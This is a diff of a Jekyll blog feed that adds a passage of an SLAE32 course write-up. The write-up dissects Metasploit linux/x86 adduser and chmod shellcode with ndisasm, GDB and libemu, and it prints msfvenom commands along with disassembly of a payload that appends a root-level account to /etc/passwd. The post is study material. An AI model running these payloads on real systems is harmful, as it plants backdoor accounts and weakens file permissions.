@@ -1,4 +1,608 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-05T19:46:17+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/02/Assign4-encoder.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-02T08:45:58+02:00</published><updated>2022-10-02T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/02/Assign4-encoder</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/02/Assign4-encoder.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-09T11:50:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jeremy Catelain</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-05T08:45:58+02:00</published><updated>2022-10-05T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/05/Assign5-Msfpayload.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Take up at least 3 shellcode samples created using Msfpayload for linux/x86&lt;/li&gt;
+  &lt;li&gt;Use GDB/NDisasm/Libemu to dissect the functionality of the shellcode&lt;/li&gt;
+  &lt;li&gt;Present your analysis&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We are going to analyse together the following shellcodes:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;linux/x86/adduser&lt;/li&gt;
+  &lt;li&gt;linux/x86/exec&lt;/li&gt;
+  &lt;li&gt;linux/x86/meterpreter/reverse_tcp -TO SUPP&lt;/li&gt;
+  &lt;li&gt;linux/x86/chmod&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!--more--&gt;
+
+&lt;h3 id=&quot;-part-1---linuxx86adduser-shellcode-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Part 1 - linux/x86/adduser shellcode &lt;/span&gt;&lt;/h3&gt;
+
+&lt;h4 id=&quot;-principle-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Principle &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;This first shellcode creates a user named ‘metasploit’ with the password ‘metasploit’.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;metasploit:metasploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To analyse the shellcode we use ndisasm to display the instructions as follows :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/adduser R | ndisasm -u -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Code result :&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000  31C9              xor ecx,ecx
+00000002  89CB              mov ebx,ecx
+00000004  6A46              push byte +0x46
+00000006  58                pop eax
+00000007  CD80              int 0x80 // setreuid
+00000009  6A05              push byte +0x5
+0000000B  58                pop eax
+0000000C  31C9              xor ecx,ecx
+0000000E  51                push ecx
+0000000F  6873737764        push dword 0x64777373
+00000014  682F2F7061        push dword 0x61702f2f
+00000019  682F657463        push dword 0x6374652f
+0000001E  89E3              mov ebx,esp
+00000020  41                inc ecx
+00000021  B504              mov ch,0x4
+00000023  CD80              int 0x80 // Open
+00000025  93                xchg eax,ebx
+00000026  E828000000        call 0x53
+0000002B  6D                insd
+0000002C  657461            gs jz 0x90
+0000002F  7370              jnc 0xa1
+00000031  6C                insb
+00000032  6F                outsd
+00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
+0000003B  736A              jnc 0xa7
+0000003D  3470              xor al,0x70
+0000003F  3449              xor al,0x49
+00000041  52                push edx
+00000042  633A              arpl [edx],di
+00000044  303A              xor [edx],bh
+00000046  303A              xor [edx],bh
+00000048  3A2F              cmp ch,[edi]
+0000004A  3A2F              cmp ch,[edi]
+0000004C  62696E            bound ebp,[ecx+0x6e]
+0000004F  2F                das
+00000050  7368              jnc 0xba
+00000052  0A598B            or bl,[ecx-0x75]
+00000055  51                push ecx
+00000056  FC                cld
+00000057  6A04              push byte +0x4
+00000059  58                pop eax
+0000005A  CD80              int 0x80 //
+0000005C  6A01              push byte +0x1
+0000005E  58                pop eax
+0000005F  CD80              int 0x80 //
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;-execution-of-the-shellcode-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Execution of the shellcode &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;The first thing we will try is to exploit the executable to see the result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.1.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Note: Be careful with unknown shellcodes.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;And when we search into the /etc/passwd file, we can see that the user has been well added as we can see:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we will look into more details about this shellcode.&lt;/p&gt;
+
+&lt;h4 id=&quot;-1---setreuid-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 1 - setreuid &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;The first instructions passed are as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    00000000  31C9              xor ecx,ecx
+    00000002  89CB              mov ebx,ecx
+    00000004  6A46              push byte +0x46
+    00000006  58                pop eax
+    00000007  CD80              int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.8.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the registers passed to that syscall are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x46 which is 70 in decimal&lt;/li&gt;
+  &lt;li&gt;EBX = 0&lt;/li&gt;
+  &lt;li&gt;ECX = 0&lt;/li&gt;
+  &lt;li&gt;EDX = 0&lt;/li&gt;
+  &lt;li&gt;ESI = 0&lt;/li&gt;
+  &lt;li&gt;EDI = 0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So when we look at the syscall number 70 into “/usr/include/x86_64-linux-gnu/asm/unistd_32.h” and we get the setreuid syscall:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 70
+#define __NR_setreuid 70
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Details of the syscall:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setreuid - set real and/or effective user ID
+int setreguid(uid_t ruid, uid_t euid);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The analysis shows a setruid call with a real and effective user ID set to 0. By doing that, a privilege elevation is performed. Indeed, it changes the user ID of the user who launch the shellcode to 0 which corresponds to the root user ID.&lt;/p&gt;
+
+&lt;h4 id=&quot;--2---open-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt;  2 - Open &lt;/span&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000009  6A05              push byte +0x5
+0000000B  58                pop eax
+0000000C  31C9              xor ecx,ecx
+0000000E  51                push ecx
+0000000F  6873737764        push dword 0x64777373 // dwss
+00000014  682F2F7061        push dword 0x61702f2f // ap//
+00000019  682F657463        push dword 0x6374652f // cte/
+0000001E  89E3              mov ebx,esp
+00000020  41                inc ecx
+00000021  B504              mov ch,0x4
+00000023  CD80              int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.9.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The registers passed to that syscall are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x5 (Open syscall)&lt;/li&gt;
+  &lt;li&gt;EBX = /etc//passwd&lt;/li&gt;
+  &lt;li&gt;ECX = 0x401&lt;/li&gt;
+  &lt;li&gt;EDX = 0&lt;/li&gt;
+  &lt;li&gt;ESI = 0&lt;/li&gt;
+  &lt;li&gt;EDI = 0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So when look at the syscall number 5 we get the setreuid call :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define __NR_open 5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Syscall details:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;open - open and possibly create a file
+int open(const char *pathname, int flags)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;EBX - Explanation&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;If we look at the push performed and then move into the EBX register, we can see that the values as follows are pushed:&lt;/p&gt;
+
+&lt;p&gt;push dword 0x64777373 // dwss
+push dword 0x61702f2f // ap//
+push dword 0x6374652f // cte/&lt;/p&gt;
+
+&lt;p&gt;Because of the little endian, the values are inversed but if we put them in the other way, it becomes “/etc//passwd”. 
+And with the push ECX performed before, the value of EBX becomes /etc//passwd0x00.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;ECX - Explanation:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Technic 1&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The easiest way to find the flags parameters passed to the ECX registers is to use the tool strace.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/adduser# strace ./adduser 2&amp;gt;&amp;amp;1 | grep open
+open(&quot;/etc//passwd&quot;, O_WRONLY|O_APPEND) = 3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It displays the paramters O_WRONLY and O_APPEND have been passed to the open function.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;Technic 2&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The second technic is by looking at the value 0x401 passed to ECX.
+If we try to convert the value in decimal, it gives 2001 as we can see:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# printf &quot;%o\n&quot; 0x401
+2001
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To find the corresponding flags, we have to look into the /usr/include/asm-generic/fcntl.h file and as we can see it confirms that the flag values are:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define O_WRONLY	00000001 
+#define O_APPEND	00002000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For the first one, the detail in the man 2 open page shows:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The argument flags must include one of the following access modes: O_RDONLY, O_WRONLY, or O_RDWR. 
+These request opening the file read-only, write-only, or read/write, respectively.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And for the second one, the details in the man 2 open page shows:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O_APPEND
+    The  file  is  opened in append mode.  Before each write(2), the file offset is posi‐
+    tioned at the end of the file, as if with lseek(2).  The  modification  of  the  file
+    offset and the write operation are performed as a single atomic step.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, by specifying the O_WRONLY and the O_APPEND flags, the file permissions set are respectively the write only and the writing of the data at the end of the file.&lt;/p&gt;
+
+&lt;h4 id=&quot;--3---jmp-call-pop-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt;  3 - JMP-CALL-POP &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;In the instruction section, we can see the following instructions:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000025  93                xchg eax,ebx
+00000026  E828000000        call 0x53
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So to better understand the behavior, we look at it into GDB which gave the following instructions:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048079:	xchg   ebx,eax
+0x804807a:	call   0x80480a7
+0x80480a7:	pop    ecx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The first instruction store the file descriptor into EAX. Then, as we could see into GDB, the JMP-CALL-POP technic is used to retrive the address of the string that needs to be inserted into the /etc/passwd file. The last instruction store the address of the following value :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ECX: 0x804807f (&quot;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀&quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;-4---write-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 4 - Write &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;Then in GDB, we display the newt instructions :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x80480a8:	mov    edx,DWORD PTR [ecx-0x4] // Length
+0x80480ab:	push   0x4
+0x80480ad:	pop    eax
+0x80480ae:	int    0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.7.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see the register values are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x4 // Write Syscall&lt;/li&gt;
+  &lt;li&gt;EBX = 0x3 // File descriptor&lt;/li&gt;
+  &lt;li&gt;ECX = 0x804807f // Address of the values to write&lt;/li&gt;
+  &lt;li&gt;EDX = 0x28 // 40 in decimal&lt;/li&gt;
+  &lt;li&gt;ESI = 0&lt;/li&gt;
+  &lt;li&gt;EDI = 0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So when we look at the syscall number 4 into “/usr/include/x86_64-linux-gnu/asm/unistd_32.h” and we get the write syscall:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 4
+#define __NR_write 4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;man 2 write result:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssize_t write(int fd, const void *buf, size_t count);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, this syscall write in the /etc/passwd file the string ‘metasploit:Az/dIsj4p4IRc:0:0:: /:/bin/sh\n’’ with a length of 40.&lt;/p&gt;
+
+&lt;h4 id=&quot;-5---exit-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 5 - Exit &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;GDB displayed the final instructions as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x80480b0:	push   0x1
+0x80480b2:	pop    eax
+0x80480b3:	int    0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.10.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see the register values are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0x1 // Exit Syscall&lt;/li&gt;
+  &lt;li&gt;EBX = 0x3 // File descriptor&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So, we look into the unistd_32.h file to find the corresponding syscall and it seems that is is an Exit syscall.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 1
+#define __NR_exit 1_
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Result : 
+The final instruction perform an Exit syscall and it let a random value for the status parameter.&lt;/p&gt;
+
+&lt;h3 id=&quot;-part-2---linuxx86chmod-shellcode-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Part 2 - linux/x86/chmod shellcode &lt;/span&gt;&lt;/h3&gt;
+
+&lt;h4 id=&quot;-principle--1&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Principle &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;This linux/x86/chmod shellcode runs a chmod command on a specified file with specified mode.&lt;/p&gt;
+
+&lt;p&gt;To analyze the shellcode purpose, the file “restrictedfile” is created with the specifications as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# ls -l /etc/restrictedfile 
+-rw-r--r-- 1 root root 0 févr. 16 20:44 /etc/restrictedfile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The rights attributed to the file are initially 0644 and in this exercise, we are going to analyse a shellcode which change them to 0777.&lt;/p&gt;
+
+&lt;p&gt;To make sure that the shellcode works, we created it shellcode and executed it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.11.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, the rights on the file have been changed successfully.&lt;/p&gt;
+
+&lt;h4 id=&quot;-analysis-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Analysis &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;To analyse the shellcode we can use several technics.
+First, we can use directly GDB to go step by step and stop (break) at each syscall and look at the register’s values.&lt;/p&gt;
+
+&lt;p&gt;Then, we can used the libemu/tools/sctest script to analyse it:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/chmod R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000
+        -S : read shellcode from stdin
+        -s : how much of the shellcode we would like to run (100000 =&amp;gt; to have all the shellcode executed)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And, we used the graphical option to help to visualize it:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/chmod FILE=/etc/restrictedfile MODE=0777 R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G chmod.dot
+//Then convert into PNG file :
+dot chmod.dot -Tpng -o chmod.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, we can display the instruction with the following command line:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/chmod FILE=/etc/restrictedfile MODE=0777 R | ndisasm -u -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this assessment, we will use all of those technic to be more accurate on the actions performed.&lt;/p&gt;
+
+&lt;p&gt;Shellcode instructions:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	cdq    
+0x8048055:	push   0xf
+0x8048057:	pop    eax
+0x8048058:	push   edx
+0x8048059:	call   0x8048072
+0x804805e:	das    
+0x804805f:	gs je  0x80480c5
+0x8048062:	das    
+0x8048063:	jb     0x80480ca
+0x8048065:	jae    0x80480db
+0x8048067:	jb     0x80480d2
+0x8048069:	arpl   WORD PTR [ebp+eiz*2+0x64],si
+0x804806d:	imul   bp,WORD PTR [ebp+eiz*2+0x0],0x685b
+0x8048074:	inc    DWORD PTR [ecx]
+0x8048076:	add    BYTE PTR [eax],al
+0x8048078:	pop    ecx
+0x8048079:	int    0x80
+0x804807b:	push   0x1
+0x804807d:	pop    eax
+0x804807e:	int    0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;-1---chmod-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; 1 - CHMOD &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;The first instruction are as follows :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	cdq    
+0x8048055:	push   0xf // decimal value = 15
+0x8048057:	pop    eax
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, the hexadecimal value 0xf (15 in decimal) is poped into the EAX register. We searched for the syscall associated to the decimal value 15 and we found that it corresponds to the chmod syscall.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 15
+#define __NR_chmod 15
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Syscall details:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod - change permissions of a file
+int chmod(const char *pathname, mode_t mode);    
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that the chmod function is constituted as follows:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;*pathname: Pointer pointing to the string of the targeted file pathname;&lt;/li&gt;
+  &lt;li&gt;mode: Mode to apply to the file.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The technic of the jump call pop is used to retrive the address of the string “/etc/restricted” as we can see:&lt;/p&gt;
+
+&lt;p&gt;Call instruction:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.13.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pop Instruction:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.14.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Address of the string “/etc/restricted” strored into the register EBX:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.15.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then the next step is to set up the second parameter “mode”. 
+The next instructions showed by GDB are as follows:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.16.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, it pop into the ECX register the value “0x1ff” which correspond to the decimal value 777 that we specified in an option of our shellcode.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# printf &quot;%o\n&quot; 0x1ff
